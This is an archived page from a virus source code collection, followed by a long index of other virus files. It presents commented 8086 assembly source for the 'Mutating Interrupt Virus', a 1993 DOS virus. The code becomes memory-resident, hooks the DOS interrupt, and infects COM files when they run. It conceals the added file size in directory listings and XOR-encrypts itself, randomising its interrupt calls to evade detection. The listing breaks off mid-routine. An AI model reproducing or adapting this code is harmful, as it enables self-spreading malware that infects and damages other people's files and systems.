<html>
<head><meta http-equiv=Content-Type content='text/html; charset=UTF-8'>

<title>Virus Source Code Database :: mutint_asm</title>
<meta name="KEYWORDS" content="mutint.asm, virus source, source code, assembly language, assembly programming, hacking, cracking, michaelangelo, stoned, pong, cascade, ambulance, f-prot, mcafee, panda, solomon, anti-virus, anti virus, computer virus">
<meta name="DESCRIPTION" content="Virus Source Code Database - source for mutint.asm">
</head><body><table border=0 cellpadding=0 cellspacing=0 width="100%">
<tr><td valign=top width="25%">
<a href="madden__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden__asm.php">madden__asm</a><br>
<a href="madden_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/madden_asm.php">madden_asm</a><br>
<a href="maddenb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maddenb_asm.php">maddenb_asm</a><br>
<a href="made_334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made_334_asm.php">made_334_asm</a><br>
<a href="made-334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made-334_asm.php">made-334_asm</a><br>
<a href="made334_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/made334_asm.php">made334_asm</a><br>
<a href="makestnd_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/makestnd_asm.php">makestnd_asm</a><br>
<a href="maketorm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maketorm_asm.php">maketorm_asm</a><br>
<a href="malaria_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malaria_asm.php">malaria_asm</a><br>
<a href="malmsey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/malmsey_asm.php">malmsey_asm</a><br>
<a href="manvir_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/manvir_asm.php">manvir_asm</a><br>
<a href="mar_860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar_860_asm.php">mar_860_asm</a><br>
<a href="mar-860__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860__asm.php">mar-860__asm</a><br>
<a href="mar-860_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mar-860_asm.php">mar-860_asm</a><br>
<a href="maria_k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria_k_asm.php">maria_k_asm</a><br>
<a href="maria-k_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maria-k_asm.php">maria-k_asm</a><br>
<a href="marked_x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked_x_asm.php">marked_x_asm</a><br>
<a href="marked-x_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/marked-x_asm.php">marked-x_asm</a><br>
<a href="mark_ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark_ii_asm.php">mark_ii_asm</a><br>
<a href="mark-ii_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mark-ii_asm.php">mark-ii_asm</a><br>
<a href="maruad_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/maruad_asm.php">maruad_asm</a><br>
<a href="massacre_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/massacre_asm.php">massacre_asm</a><br>
<a href="master_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/master_asm.php">master_asm</a><br>
<a href="mataj13_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mataj13_asm.php">mataj13_asm</a><br>
<a href="matt_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/matt_asm.php">matt_asm</a><br>
<a href="max_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/max_asm.php">max_asm</a><br>
<a href="mbug1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mbug1_asm.php">mbug1_asm</a><br>
<a href="mcwhale_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mcwhale_asm.php">mcwhale_asm</a><br>
<a href="megabug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megabug_asm.php">megabug_asm</a><br>
<a href="megastel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megastel_asm.php">megastel_asm</a><br>
<a href="megatroj_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/megatroj_asm.php">megatroj_asm</a><br>
<a href="meltdown_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/meltdown_asm.php">meltdown_asm</a><br>
<a href="met_moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met_moon_asm.php">met_moon_asm</a><br>
<a href="met-moon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/met-moon_asm.php">met-moon_asm</a><br>
<a href="mg1a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1a_asm.php">mg1a_asm</a><br>
<a href="mg1b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1b_asm.php">mg1b_asm</a><br>
<a href="mg1c_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1c_asm.php">mg1c_asm</a><br>
<a href="mg1d_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg1d_asm.php">mg1d_asm</a><br>
<a href="mg2_____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_____asm.php">mg2_____asm</a><br>
<a href="mg2____asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2____asm.php">mg2____asm</a><br>
<a href="mg2___asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2___asm.php">mg2___asm</a><br>
<a href="mg2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg2_asm.php">mg2_asm</a><br>
<a href="mg_3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg_3_asm.php">mg_3_asm</a><br>
<a href="mg-3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg-3_asm.php">mg-3_asm</a><br>
<a href="mg3__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3__asm.php">mg3__asm</a><br>
<a href="mg3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg3_asm.php">mg3_asm</a><br>
<a href="mgagent1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent1_asm.php">mgagent1_asm</a><br>
<a href="mgagent2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent2_asm.php">mgagent2_asm</a><br>
<a href="mgagent3_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgagent3_asm.php">mgagent3_asm</a><br>
<a href="mg__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mg__asm.php">mg__asm</a><br>
<a href="m-gen_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-gen_asm.php">m-gen_asm</a><br>
<a href="mgtest1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest1_asm.php">mgtest1_asm</a><br>
<a href="mgtest2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mgtest2_asm.php">mgtest2_asm</a><br>
<a href="m_hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_hivb_asm.php">m_hivb_asm</a><br>
<a href="m-hivb_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-hivb_asm.php">m-hivb_asm</a><br>
<a href="mich2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich2_asm.php">mich2_asm</a><br>
<a href="michangl_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michangl_asm.php">michangl_asm</a><br>
<a href="mich_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_asm.php">mich_asm</a><br>
<a href="michel2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel2_asm.php">michel2_asm</a><br>
<a href="michel_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michel_asm.php">michel_asm</a><br>
<a href="michfile_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/michfile_asm.php">michfile_asm</a><br>
<a href="mich_ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich_ld_asm.php">mich_ld_asm</a><br>
<a href="mich-ld_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mich-ld_asm.php">mich-ld_asm</a><br>
<a href="micro29_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/micro29_asm.php">micro29_asm</a><br>
<a href="mike_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_asm.php">mike_asm</a><br>
<a href="mike_c.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mike_c.php">mike_c</a><br>
<a href="mikey_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mikey_asm.php">mikey_asm</a><br>
<a href="mindles__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindles__asm.php">mindles__asm</a><br>
<a href="mindless_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindless_asm.php">mindless_asm</a><br>
<a href="mindlss_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mindlss_asm.php">mindlss_asm</a><br>
<a href="mini_35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_35_asm.php">mini_35_asm</a><br>
<a href="mini-35_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-35_asm.php">mini-35_asm</a><br>
<a href="mini40__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40__asm.php">mini40__asm</a><br>
<a href="mini40_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini40_asm.php">mini40_asm</a><br>
<a href="mini_42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_42b_asm.php">mini_42b_asm</a><br>
<a href="mini-42b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-42b_asm.php">mini-42b_asm</a><br>
<a href="mini_45_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_45_asm.php">mini_45_asm</a><br>
<a href="mini_68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_68_asm.php">mini_68_asm</a><br>
<a href="mini-68_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini-68_asm.php">mini-68_asm</a><br>
<a href="mini_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mini_asm.php">mini_asm</a><br>
<a href="minimal_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/minimal_asm.php">minimal_asm</a><br>
<a href="miniscul_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/miniscul_asm.php">miniscul_asm</a><br>
<a href="misery_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/misery_asm.php">misery_asm</a><br>
<a href="mix1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mix1_asm.php">mix1_asm</a><br>
<a href="mkworm_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mkworm_asm.php">mkworm_asm</a><br>
<a href="ml_366a__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a__asm.php">ml_366a__asm</a><br>
<a href="ml_366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml_366a_asm.php">ml_366a_asm</a><br>
<a href="ml366a_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/ml366a_asm.php">ml366a_asm</a><br>
<a href="mlp_1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp_1307_asm.php">mlp_1307_asm</a><br>
<a href="mlp-1307_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mlp-1307_asm.php">mlp-1307_asm</a><br>
<a href="mm_122_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mm_122_asm.php">mm_122_asm</a><br>
<a href="mmirdest_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirdest_asm.php">mmirdest_asm</a><br>
<a href="mmirfade_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirfade_asm.php">mmirfade_asm</a><br>
<a href="mmirlisa_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirlisa_asm.php">mmirlisa_asm</a><br>
<a href="mmirmoon_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirmoon_asm.php">mmirmoon_asm</a><br>
<a href="mmirunkn_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mmirunkn_asm.php">mmirunkn_asm</a><br>
<a href="m_murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph1_asm.php">m_murph1_asm</a><br>
<a href="m-murph1_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph1_asm.php">m-murph1_asm</a><br>
<a href="m_murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_murph2_asm.php">m_murph2_asm</a><br>
<a href="m-murph2_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph2_asm.php">m-murph2_asm</a><br>
<a href="m-murph__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-murph__asm.php">m-murph__asm</a><br>
<a href="mojave_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mojave_asm.php">mojave_asm</a><br>
<a href="monami_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monami_asm.php">monami_asm</a><br>
<a href="monkeys_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monkeys_asm.php">monkeys_asm</a><br>
<a href="monxla_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/monxla_asm.php">monxla_asm</a><br>
<a href="mordor_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mordor_asm.php">mordor_asm</a><br>
<a href="morgoth__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth__asm.php">morgoth__asm</a><br>
<a href="morgoth_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/morgoth_asm.php">morgoth_asm</a><br>
<a href="mpc-783_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpc-783_asm.php">mpc-783_asm</a><br>
<a href="mpciguan_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpciguan_asm.php">mpciguan_asm</a><br>
<a href="mpcsnort_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpcsnort_asm.php">mpcsnort_asm</a><br>
<a href="mpsopc31_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc31_asm.php">mpsopc31_asm</a><br>
<a href="mpsopc32_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mpsopc32_asm.php">mpsopc32_asm</a><br>
<a href="msdos_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/msdos_asm.php">msdos_asm</a><br>
<a href="mte_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mte_asm.php">mte_asm</a><br>
<a href="m_torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m_torma_asm.php">m_torma_asm</a><br>
<a href="m-torma_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/m-torma_asm.php">m-torma_asm</a><br>
<a href="muad'di__asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'di__asm.php">muad'di__asm</a><br>
<a href="muad_dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad_dib_asm.php">muad_dib_asm</a><br>
<a href="muad'dib_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muad'dib_asm.php">muad'dib_asm</a><br>
<a href="mudshark_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mudshark_asm.php">mudshark_asm</a><br>
<a href="multiflu_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiflu_asm.php">multiflu_asm</a><br>
<a href="multiplx_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/multiplx_asm.php">multiplx_asm</a><br>
<a href="mummy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mummy_asm.php">mummy_asm</a><br>
<a href="mumzi!_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mumzi!_asm.php">mumzi!_asm</a><br>
<a href="murphexe_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphexe_asm.php">murphexe_asm</a><br>
<a href="murphy_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/murphy_asm.php">murphy_asm</a><br>
<a href="musicbug_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/musicbug_asm.php">musicbug_asm</a><br>
<a href="mutate_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutate_asm.php">mutate_asm</a><br>
<a href="mutatint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutatint_asm.php">mutatint_asm</a><br>
<a href="mut_gard_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut_gard_asm.php">mut_gard_asm</a><br>
<a href="mutint_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mutint_asm.php">mutint_asm</a><br>
<a href="mut-tiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mut-tiny_asm.php">mut-tiny_asm</a><br>
<a href="muttiny_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/muttiny_asm.php">muttiny_asm</a><br>
<a href="mystic_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic_asm.php">mystic_asm</a><br>
<a href="mystic-b_asm.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/mystic-b_asm.php">mystic-b_asm</a><br>
</td>
<td valign=top><center><h2>Virus Source Code Database</h2>
<script type="text/javascript">
<!--
                  google_ad_client = "pub-4280558320877613";
                  google_ad_width = 468;
                  google_ad_height = 60;
                  google_ad_format = "468x60_as";
                  google_ad_channel = "5524853059";
                  google_ad_type = "text";
                  google_color_border = "A2CCEE";
                  google_color_bg = "EFEFEF";
                  google_color_link = "000000";
                  google_color_url = "006600";
                  google_color_text = "000000";
        //--></script>
<script type="text/javascript" src="show_ads.js" tppabs="http://pagead2.googlesyndication.com/pagead/show_ads.js"></script>
<p>
<i>This source code is provided for computer programming history.  This source code can be used for good or evil.  It can 
destroy computer data.  Be aware that I am making no claims to authorship or usability of the information found in the 
Virus Source Code Database.  I accept no responsibility for data corruption due to the use of the following information.  The 
information contained on this website is for <b>Information Purposes Only</b>!!!</i><p>
<p>
[ <a href="index.php.htm" tppabs="http://www.totallygeek.com/vscdb/1/index.php">1</a> ]&nbsp;
[ <a href="index-1.php.htm" tppabs="http://www.totallygeek.com/vscdb/a/index.php">a</a> ]&nbsp;
[ <a href="index-2.php.htm" tppabs="http://www.totallygeek.com/vscdb/b/index.php">b</a> ]&nbsp;
[ <a href="index-3.php.htm" tppabs="http://www.totallygeek.com/vscdb/c/index.php">c</a> ]&nbsp;
[ <a href="index-4.php.htm" tppabs="http://www.totallygeek.com/vscdb/d/index.php">d</a> ]&nbsp;
[ <a href="index-5.php.htm" tppabs="http://www.totallygeek.com/vscdb/e/index.php">e</a> ]&nbsp;
[ <a href="index-6.php.htm" tppabs="http://www.totallygeek.com/vscdb/f/index.php">f</a> ]&nbsp;
[ <a href="index-7.php.htm" tppabs="http://www.totallygeek.com/vscdb/g/index.php">g</a> ]&nbsp;
[ <a href="index-8.php.htm" tppabs="http://www.totallygeek.com/vscdb/h/index.php">h</a> ]&nbsp;
[ <a href="index-9.php.htm" tppabs="http://www.totallygeek.com/vscdb/i/index.php">i</a> ]&nbsp;
[ <a href="index-10.php.htm" tppabs="http://www.totallygeek.com/vscdb/j/index.php">j</a> ]&nbsp;
[ <a href="index-11.php.htm" tppabs="http://www.totallygeek.com/vscdb/k/index.php">k</a> ]&nbsp;
[ <a href="index-12.php.htm" tppabs="http://www.totallygeek.com/vscdb/l/index.php">l</a> ]&nbsp;
[ <a href="index-13.php.htm" tppabs="http://www.totallygeek.com/vscdb/m/index.php">m</a> ]&nbsp;
[ <a href="index-14.php.htm" tppabs="http://www.totallygeek.com/vscdb/n/index.php">n</a> ]&nbsp;
[ <a href="index-15.php.htm" tppabs="http://www.totallygeek.com/vscdb/o/index.php">o</a> ]&nbsp;
[ <a href="index-16.php.htm" tppabs="http://www.totallygeek.com/vscdb/p/index.php">p</a> ]&nbsp;
[ <a href="index-17.php.htm" tppabs="http://www.totallygeek.com/vscdb/q/index.php">q</a> ]&nbsp;
[ <a href="index-18.php.htm" tppabs="http://www.totallygeek.com/vscdb/r/index.php">r</a> ]&nbsp;
[ <a href="index-19.php.htm" tppabs="http://www.totallygeek.com/vscdb/s/index.php">s</a> ]&nbsp;
[ <a href="index-20.php.htm" tppabs="http://www.totallygeek.com/vscdb/t/index.php">t</a> ]&nbsp;
[ <a href="index-21.php.htm" tppabs="http://www.totallygeek.com/vscdb/u/index.php">u</a> ]&nbsp;
[ <a href="index-22.php.htm" tppabs="http://www.totallygeek.com/vscdb/v/index.php">v</a> ]&nbsp;
[ <a href="index-23.php.htm" tppabs="http://www.totallygeek.com/vscdb/w/index.php">w</a> ]&nbsp;
[ <a href="index-24.php.htm" tppabs="http://www.totallygeek.com/vscdb/x/index.php">x</a> ]&nbsp;
[ <a href="index-25.php.htm" tppabs="http://www.totallygeek.com/vscdb/y/index.php">y</a> ]&nbsp;
[ <a href="index-26.php.htm" tppabs="http://www.totallygeek.com/vscdb/z/index.php">z</a> ]&nbsp;
</center><p><textarea cols=90 rows=30>

;****************************************************************************
;* The Mutating Interrupt Virus                         -Soltan Griss-
;*                                                  [RABID] -=+ Front 242 +=-
;*
;*
;* Well this is my Third Release of many to come. This virus uses the latest
;* of RABID's new inventions the "MUTATING INTERRUPT", what it does (nothing
;* to special) is Mutate all int 21h (CD 21) to a random interrupt.
;* Then before executation it will change it back to INT 21.
;*
;* Alot of people are wondering if RABID is Still around. YES. Wea reback and 
;* Kicking, although right now we have limited members, it soon will change.
;*
;*
;* Many Thanks go out to Data Disruptor, who originally came up with the 
;* interrupt swapping idea.
;*
;*
;* SOON TO COME: Why use conventional memory when do has left so many holes??
;*               Find out soon in one of our next RELEASES.
;*
;*               A Real Mutating virus with moveable modular segments!!<G>! 
;*
;*
;*
;* A Word of thanks go out to.
;*
;* YAM- Keep up the hard work. Alot of improvement come with time.
;* Admiral Bailey. Waitinf for the next version of the IVP!
;*
;*
;****************************************************************************



seg_a           segment 
                assume  cs:seg_a,ds:seg_a,es:nothing
              
        org     100h
start:  db      0E9h,06,00,42h,0f2h    ; Jump to virus + F242 id string


vstart  equ     $                
key:    dw      0                      ;encryptor key.
i_key:  dw      12cdh                  ;Interrupt key
        call    code_start 


code_start:          
        pop     si
        sub     si,offset code_start   ;get current infected files size
        mov     bp,si
        

crypter: 
        mov    cx,(vend-check) 
        mov    dh,byte ptr cs:[key+bp]
        mov    si,offset check 
        add    si,bp
loo:    mov    ah,byte ptr cs:[si]      ;Decrypt the virus   
        xor    ah,dh                       
        mov    byte ptr cs:[si],ah
        inc    si
        loop   loo

code:   

        mov     si,offset check        
        mov     di,offset check       
        mov     cx,(vend-check)    
looper: mov     ax,[si]               
        cmp     ax,word ptr cs:[i_key+bp]  ;Change interrupts back            
        je      change                
doit:   mov     [di],ax               
        inc     si                    
        inc     di                    
        loop    looper                
        jmp     check                  
change: mov     ax,21cdh              
        jmp     doit                  

check:  
        mov     ax,0F242h                 ;Check to see if we are already 
        int     12h
        cmp     bx,0F242h                 ;resident
        je      Already_here

info:   db      'The Mutating Interrupt Virus  '
        db      'RABID`S Back and Kicking in `93  -Soltan Griss-'
load:                                     ;Virus Id string so they NAME it 
                                          ; RIGHT!!!!
        push    cs      
        pop     ds

        
        mov     ah,49h                          ;Release current Memory block
        int     12h
        

        mov     ah,48h                          ;Request Hugh size of memory
        mov     bx,0ffffh                       ;returns biggest size
        int     12h
        
        

        mov     ah,4ah
        sub     bx,(vend-vstart+15)/16+(vend-vstart+15)/16+1
        jc      exit                               ;subtract virus size
        int     12h
        

        mov     ah,48h
        mov     bx,(vend-vstart+15)/16+(vend-vstart+15)/16  
        int     12h                             
        jc      exit                              ;request last XXX pages
                                                  ;allocate it to virus

        dec     ax
        
        push    es
        
        mov     es,ax
        
        mov     byte ptr es:[0],'Z'             ;make DOS the  owner
        mov     word ptr es:[1],8
        mov     word ptr es:[3],(vend-vstart+15)/8    ;put size here
        sub     word ptr es:[12h],(vend-vstart+15)/8  ;sub size from current         
                                                       ;memory
        inc     ax

        
        lea     si,[bp+offset vstart]       ;copy it to new memory block
        xor     di,di
        mov     es,ax
        mov     cx,(vend-vstart+5)/2
        cld
        rep     movsw

        
        xor     ax,ax        
        mov     ds,ax
        push    ds
        lds     ax,ds:[21h*4]                        ;swap vectors manually
        mov     word ptr es:[old_21-vstart],ax
        mov     word ptr es:[old_21-vstart+2],ds
        pop     ds
        mov     word ptr ds:[21h*4],(new_21-vstart)
        mov     ds:[21h*4+2],es

exit:
already_here:        
        push    cs
        pop     ds
        push    cs
        pop     es
        mov     si,offset buffer                     ;Copy five bytes back!
        add     si,Bp
        mov     di,100h
        movsw
        movsw
        movsb
        mov     bp,100h
        jmp     bp

        

;***************************************************************************

old_21: dw      0h,0h
buffer  db      0cdh,20h,0,0,0                  ;Buffer to hold the infected 
old_date: dw    0                               ;files 5 bytes
old_time: dw    0
jump_add: db    0E9h
          db    0,0
          db    0F2h,42h

new_21: 
        cmp     ax,0f242h                       ;Are we going resident?
        je      SAY_YES                          
        cmp     ax,4b00h                        ;Are we executing?
        je      exec
        cmp     ah,11h
        je      hide_size                       ;doing a DIR??
        cmp     ah,12h
        je      hide_size
        jmp     do_old
exec:   jmp     exec2
SAY_YES:mov     bx,0f242h                        
do_old: jmp     dword ptr cs:[(old_21-vstart)]  ;If not then do old int 21
        ret

hide_size:
        pushf
        push    cs
        call    do_old                          ;get the current FCB
        cmp     al,00h
        jnz     dir_error                       ;jump if bad FCB
        
        push    ax
        push    bx
        push    dx
        push    ds
        push    es                              ;undocumented get FCB 
        mov     ah,51h                          ;location
        int     12h
        mov     es,bx                           ;get info from FCB
        cmp     bx,es:[16h]
        jnz     not_inf
        mov     bx,dx
        mov     al,[bx]
        push    ax
        mov     ah,2fh                          ;get DTA 
        int     12h
        pop     ax
        inc     al                              ;Check for extended FCB
        jnz     normal_fcb
        add     bx,7h
normal_fcb:
        mov     ax,es:[bx+17h]
        and     ax,1fh
        xor     al,01h                          ;check for 2 seconds
        jnz     not_inf
        
        and     byte ptr es:[bx+17h],0e0h       ;subtract virus size
        sub     es:[bx+1dh],(vend-vstart)
        sbb     es:[bx+1fh],ax
not_inf:pop     es
        pop     ds
        pop     dx
        pop     bx
        pop     ax
dir_error:        
        iret 
 
exec2:  push    ax 
        push    bx
        push    cx
        push    dx
        push    ds
        push    es

        call    infect                         ;Lets infect the file!!
        
backup: pop     es
        pop     ds
        pop     dx 
        pop     cx
        pop     bx
        pop     ax

        jmp     do_old                          ;go back to original load


infect: 
        mov     ax,3d02h
        int     12h
        jc      quit1                           ;open the file
        
        
        mov     bx,ax
                
A_open: push    cs
        pop     ds

        mov     ax,4200h   
        xor     cx,cx      
        xor     dx,dx                           ;move file pointer to begining
        int     12h                             ;(FOR LATER MODIFICATION ONLY)


        mov     ah,3fh
        mov     cx,5h
        mov     dx,(buffer-vstart)              ;load in the first 5 bytes
        int     12h
        jc      quit1
        
        cmp     word ptr cs:[(buffer-vstart)],5A4Dh ;check to see if its an
        je      quit1                                                ;EXE
        
        cmp     word ptr cs:[(buffer-vstart)+3],42F2h
        je      quit1
                                                    ;if so then its infected
        
        
        jmp     qqqq

quit1:  jmp     quit2        
        
        
qqqq:   mov     ax,5700h
        int     12h
        jc      quit1

        mov     word ptr cs:[(old_time-vstart)],cx  ;get the files time 
        mov     word ptr cs:[(old_date-vstart)],dx  ;and date
 
        mov     ax,4202h          
        xor     cx,cx             
        xor     dx,dx                    ;put file pointer at end
        int     12h
        jc      quit1
        
        
        
        mov     cx,ax
        sub     cx,3                     ;write jump lenght to jump buffer
        add     cx,4
        mov     word ptr cs:[(jump_add+1-vstart)],cx



        mov     ah,2ch                 ;get random number for interrupt 
        int     12h                    ;swapping
        cmp     dh,03h                 ;don't like INT 3'S (1 byte only not 2)
        jne     write_key
        inc     dh


write_key:        
        
        mov     word ptr cs:[key-vstart],cx      ;save encryption key
        mov     byte ptr cs:[i_key-vstart+1],dh    ;save interupt key
        
        mov     si,(check-vstart)  ;write from check to end
        mov     di,(vend-vstart)
        mov     cx,(vend-check)    

topper: mov    al,byte ptr cs:[(si)]
        cmp    al,0cdh
        je     changeit
top2:   mov    byte ptr cs:[(di)],al
tor:    inc    si                       ;this "mutating routine" is kind 
        inc    di                       ;messy but i'll improve it for version
        loop   topper                   ;2.0
        jmp    crypt
changeit:
        mov    byte ptr cs:[(di)],al
        inc    di
        inc    si
        dec    cx
        mov    al,byte ptr cs:[(si)]
        cmp    al,21h
        jne    top2
        mov    byte ptr cs:[(di)],dh
        jmp    tor
        
quit:   jmp    quit2        


crypt: 
        
        

        mov    cx,(vend-check)
        mov    dh,byte ptr cs:[key-vstart]
        mov    si,(vend-vstart)
lop:    mov    ah,byte ptr cs:[si]         
        xor    ah,dh                            ;Encrypt the code   
        mov    byte ptr cs:[si],ah      
        inc    si
        loop   lop


        mov     cx,(check-vstart)  
        mov     ah,40h                          ;write decrypting routine 
        mov     dx,(vstart-vstart)              ;to file first
        int     12h
        jc      quit

        
        mov     cx,(vend-check)                    ;write the encrypted code
        mov     ah,40h                              ; to the end of the file
        mov     dx,(vend-vstart)                        
        int     12h
        jc      quit
        
        
        mov     ax,4200h                            ;move file pointer to the 
        xor     cx,cx                               ;begining to write the JMP
